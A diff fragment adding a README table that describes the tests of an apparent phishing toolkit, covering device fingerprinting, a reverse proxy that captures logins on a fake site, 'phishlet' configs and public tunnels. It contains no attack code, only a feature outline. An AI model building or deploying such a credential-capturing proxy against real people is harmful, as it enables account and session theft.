+| `tests/test_intel.py` | deep device dump: identity/device-class guessing, headless + VPN scoring with evidence, device-token stability, wave merging (and stale-error cleanup), page tag injection, collector serving, malformed/empty/oversized payloads, one-record-per-session, export, and the `--intel-dump/list/export` CLI |
+| `tests/test_proxy.py` | reverse-proxy engine against a fake multi-step login site: rewriting, hook injection, cookie isolation, capture storage, risk, malformed/empty bodies, upstream 500/down, inject/block rules, unicode + 50 KB fields, 12-way concurrency, HEAD, query strings, phishlet YAML — plus three CLI-level `--proxy` runs with an isolated `BYTEPHISHER_HOME` |
+| `tests/test_live.py` | real internet: geo lookup, cloudflared/localhost.run/bore tunnels with a public POST landing in SQLite, Flask dashboard API, real SMTP delivery via a local aiosmtpd sink, public webhook echo, CLI subprocess runs with SIGINT summary, TUI live loop |
+
+Live tests skip (with a reason) when an external service is unavailable — they
+never fake a pass.
+
